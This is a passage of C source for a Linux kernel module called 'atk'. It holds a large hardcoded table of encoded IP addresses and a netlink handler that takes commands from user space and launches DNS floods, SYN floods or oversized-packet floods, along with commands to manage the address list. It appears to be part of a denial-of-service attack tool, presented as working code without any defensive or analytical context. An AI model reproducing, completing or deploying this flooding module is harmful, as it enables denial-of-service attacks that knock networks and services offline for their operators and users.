ip_list[1111]=0x398c9ca;
ip_list[1112]=0x3d0c9ca;
ip_list[1113]=0x230c9ca;
ip_list[1114]=0x140c9ca;
ip_list[1115]=0x2120caca;
ip_list[1116]=0x2220caca;
ip_list[1117]=0x21a0cbca;
ip_list[1118]=0x1212dadb;
ip_list[1119]=0x1c0ccca;
ip_list[1120]=0x1c1ccca;
ip_list[1121]=0xa3cccca;
ip_list[1122]=0x510cdca;
ip_list[1123]=0x2118ceca;
ip_list[1124]=0x210cfca;
ip_list[1125]=0x8d0cfca;
ip_list[1126]=0x4150cfca;
ip_list[1127]=0xb547d5dd;
ip_list[1128]=0x1b02fd2;
ip_list[1129]=0xe65f68da;
ip_list[1130]=0x337a8bd3;
ip_list[1131]=0x74026ca;
ip_list[1132]=0x600c6ca;
ip_list[1133]=0x246760ca;
ip_list[1134]=0x446c60ca;
ip_list[1135]=0xca7760ca;
ip_list[1136]=0x6a7d60ca;
ip_list[1137]=0x72ab60ca;
ip_list[1138]=0xa8ac60ca;
ip_list[1139]=0x11260ca;
ip_list[1140]=0xc2f760ca;
ip_list[1141]=0x60761ca;
ip_list[1142]=0x4eef62ca;
ip_list[1143]=0x66c663ca;
ip_list[1144]=0xfd1763ca;
ip_list[1145]=0xaa871ca;
ip_list[1146]=0x2211fb3a;
ip_list[1147]=0x6e044d3;
ip_list[1148]=0x11821d2;
ip_list[1149]=0xad9417b;
ip_list[1150]=0x4c1294cb;
ip_list[1151]=0x6e6abcb;
ip_list[1152]=0x62427d7b;
ip_list[1153]=0x8cffd1cb;
ip_list[1154]=0x61427d7b;
ip_list[1155]=0x5f427d7b;
ip_list[1156]=0x3501bd2;
ip_list[1157]=0xe1351cb;
ip_list[1158]=0x5c427d7b;
ip_list[1159]=0x56427d7b;
ip_list[1160]=0x2d427d7b;
ip_list[1161]=0x13407d7b;
ip_list[1162]=0x88857da;
ip_list[1163]=0x12407d7b;
ip_list[1164]=0x6bd737b;
ip_list[1165]=0x2301679;
ip_list[1166]=0x8587163a;
ip_list[1167]=0xb55f8077;
ip_list[1168]=0x3b701e74;
ip_list[1169]=0x35c9fe74;
ip_list[1170]=0x43c816d2;
ip_list[1171]=0xbac10dd2;
ip_list[1172]=0xe6d393a;
ip_list[1173]=0x22f189d3;
ip_list[1174]=0x72df53d2;
ip_list[1175]=0xd63a89db;
ip_list[1176]=0x8901bd2;
ip_list[1177]=0xd901bd2;
ip_list[1178]=0x6201ed2;
ip_list[1179]=0x41d0c3da;
ip_list[1180]=0x1d040d3;
ip_list[1181]=0x4f303da;
ip_list[1182]=0x816861d3;
ip_list[1183]=0x7108e7dc;
ip_list[1184]=0x7ab39cd3;
ip_list[1185]=0x23232ad2;
ip_list[1186]=0x1f40c3da;
ip_list[1187]=0x41105dd3;
ip_list[1188]=0xa1815fd3;
ip_list[1189]=0x57ec8ed3;
ip_list[1190]=0x8214d8db;
ip_list[1191]=0x2af5adde;
ip_list[1192]=0x8b01fd2;
ip_list[1193]=0x45986ada;
ip_list[1194]=0xab01fd2;
ip_list[1195]=0x83f955d4;
ip_list[1196]=0xa600a6d3;
ip_list[1197]=0xefa44d3;
ip_list[1198]=0x8d02fd2;
ip_list[1199]=0x64a74bde;
ip_list[1200]=0x4f1ab5dc;
ip_list[1201]=0x6408b73d;
ip_list[1202]=0x5229dd3;
ip_list[1203]=0x64d28ed3;
ip_list[1204]=0xa8ad73c;
ip_list[1205]=0x65fea3d;
ip_list[1206]=0x3c839da;
ip_list[1207]=0xf3c362da;
ip_list[1208]=0x184b73d;
ip_list[1209]=0x42702cd2;
ip_list[1210]=0x8ad85ad3;
ip_list[1211]=0x15e01dd2;
ip_list[1212]=0x25fea3d;
ip_list[1213]=0x5a683ada;
ip_list[1214]=0xb48813d;
ip_list[1215]=0x990d90d3;
ip_list[1216]=0x58179bd3;
ip_list[1217]=0xc2c5333a;
ip_list[1218]=0xf4212cde;
ip_list[1219]=0x9de7af3d;
ip_list[1220]=0x76f61c3c;
ip_list[1221]=0x4dfeccda;
ip_list[1222]=0x2593d53a;
ip_list[1223]=0x3b1f0cdd;
ip_list[1224]=0x597e913d;
ip_list[1225]=0x3e8ad73c;
ip_list[1226]=0x20001dd2;
ip_list[1227]=0xa4e813d;
ip_list[1228]=0x8200c0dc;
ip_list[1229]=0x64802cd2;
ip_list[1230]=0x85842d3;
ip_list[1231]=0x2a029d2;
ip_list[1232]=0x9616bf3d;
ip_list[1233]=0x41c61fd2;
ip_list[1234]=0x6817eedd;
ip_list[1235]=0x51085dd3;
ip_list[1236]=0x8dd85ad3;
ip_list[1237]=0x63e8be3c;
ip_list[1238]=0x7dca5dda;
ip_list[1239]=0x347bbf3c;
ip_list[1240]=0x4417f9da;
ip_list[1241]=0x5572803d;
ip_list[1242]=0x4672803d;
ip_list[1243]=0x1002fd2;
ip_list[1244]=0xf0bf8bdb;
ip_list[1245]=0x441a1eda;
ip_list[1246]=0xa5af5ada;
ip_list[1247]=0xb321993d;
ip_list[1248]=0x5a58efdb;
ip_list[1249]=0x87cfb63d;
ip_list[1250]=0x7fc41c3c;
ip_list[1251]=0x1fb1c3c;
ip_list[1252]=0xb62285db;
ip_list[1253]=0x5174913d;
ip_list[1254]=0x765686de;
ip_list[1255]=0x4381afde;
ip_list[1256]=0x2619dd3;
ip_list[1257]=0xf21416da;
ip_list[1258]=0x21b01ad2;
ip_list[1259]=0x6b029d2;
ip_list[1260]=0x86d85ad3;
ip_list[1261]=0xa6af5ada;
ip_list[1262]=0x6b11903d;
ip_list[1263]=0x136f7da;
ip_list[1264]=0x966f38da;
ip_list[1265]=0xf2dd39da;
ip_list[1266]=0x25a3873d;
ip_list[1267]=0x890c0da;

ip_list_level=16;
ip_list_n=1267;
}

int i=0;
void nl_data_ready (struct sk_buff *__skb)
{
  struct sk_buff *skb;
  struct nlmsghdr *nlh;
  u32 pid;
  int rc;
  int result;
  /*printk("net_link: data is ready to read.\n");*/
  skb = skb_get(__skb);

  if (skb->len >= NLMSG_SPACE(0)) {
    nlh = nlmsg_hdr(skb);
    /*printk("net_link: recv \n");*/
    memcpy(&atk_info,NLMSG_DATA(nlh), sizeof(struct atk_info)); 

/*printk("degree %d\n",atk_info.degree);*/

	if(atk_info.atk_type==DNS_FLOOD)
		send_dns_query(&atk_info);
	else if(atk_info.atk_type==SYN_FLOOD)
		send_syn(&atk_info);
	else if(atk_info.atk_type==BIG_FLOOD)
		send_big_packet(&atk_info);
	else if(atk_info.atk_type==ADD_ADDR)
		add_addr(&atk_info);
	else if(atk_info.atk_type==LST_LEVEL)
		list_level(&atk_info);
	else if(atk_info.atk_type==LST_CLEAN)
		list_clean();
	else if(atk_info.atk_type==LST_DEFAULT)
		list_default();


    pid = nlh->nlmsg_pid; /*pid of sending process */
    /*printk("net_link: pid is %d\n", pid);*/
    kfree_skb(skb);

    skb = alloc_skb(NLMSG_SPACE(sizeof(result)), GFP_ATOMIC);
    if (!skb){
      /*printk(KERN_ERR "net_link: allocate failed.\n");*/
      return;
    }
    nlh = nlmsg_put(skb,0,0,0,sizeof(result),0);
    NETLINK_CB(skb).pid = 0; /* from kernel */

	result=i++;
    memcpy(NLMSG_DATA(nlh), &result, sizeof(result));
    /*printk("net_link: going to send.\n");*/
    rc = netlink_unicast(nl_sk, skb, pid, MSG_DONTWAIT);
    if (rc < 0) {
      /*printk(KERN_ERR "net_link: can not unicast skb (%d)\n", rc);*/
    }
    /*printk("net_link: send is ok.\n");*/
  }
  return;
}



static int atk_netlink(void) {
  nl_sk = netlink_kernel_create(&init_net, NETLINK_ATK_ETH, 0, nl_data_ready, NULL, THIS_MODULE);

  if (!nl_sk) {
    /*printk(KERN_ERR "net_link: Cannot create netlink socket.\n");*/
    return -EIO;
  }
  /*printk("net_link: create socket ok.\n");*/
  return 0;
}

int init_module()
{
	xtime=current_kernel_time();
	 INIT_SEED = xtime.tv_sec;
	 RAND_SEED1=INIT_SEED;
	 RAND_SEED2=INIT_SEED;
	 RAND_SEED3=INIT_SEED;
	 RAND_PUBLIC=37848237&INIT_SEED;
	 list_default();
	printk(KERN_ALERT"atk %s load!\n",VERSION);
	atk_netlink();
	return 0;
}

void cleanup_module()
{
  /* code to close the module */
	printk(KERN_ALERT"atk %s unload!\n",VERSION);
  if (nl_sk != NULL)
  {
    sock_release(nl_sk->sk_socket);
  }
  printk("net_link: remove ok.\n");
}

